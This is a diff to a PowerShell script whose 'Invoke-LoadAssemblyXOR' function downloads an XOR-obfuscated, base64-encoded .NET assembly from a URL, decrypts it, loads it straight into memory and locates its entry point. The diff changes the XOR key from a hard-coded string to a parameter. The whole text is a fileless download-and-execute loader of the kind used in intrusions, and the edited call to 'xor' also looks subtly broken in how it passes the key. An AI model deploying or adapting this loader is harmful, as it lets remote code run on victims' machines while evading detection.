@@ -1,8 +1,8 @@
 $enc = [System.Text.Encoding]::UTF8
 
 function xor {
-    param($string, $method)
-    $xorkey = $enc.GetBytes("secretkey")
+    param($string, $method, $key)
+    $xorkey = $enc.GetBytes($key)
 
     if ($method -eq "decrypt"){
         $string = $enc.GetString([System.Convert]::FromBase64String($string))
@@ -37,14 +37,17 @@ function Invoke-LoadAssemblyXOR
         [ValidateNotNullorEmpty()]
         [String]
         $AssemblyUrl,
-        [Parameter(Position = 1, Mandatory = $false)]
+        [Parameter(Position = 1, Mandatory = $true)]
+        [String]
+        $Key,
+        [Parameter(Position = 2, Mandatory = $false)]
         [String]
         $Command
         )
 
     $WebClient = New-Object System.Net.WebClient
-    $t = $WebClient.DownloadString($AssemblyUrl);
-    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $t "decrypt"));
+    $xorb64_bin = $WebClient.DownloadString($AssemblyUrl);
+    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt", $Key));
     $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
 
     $ep = $assembly.EntryPoint
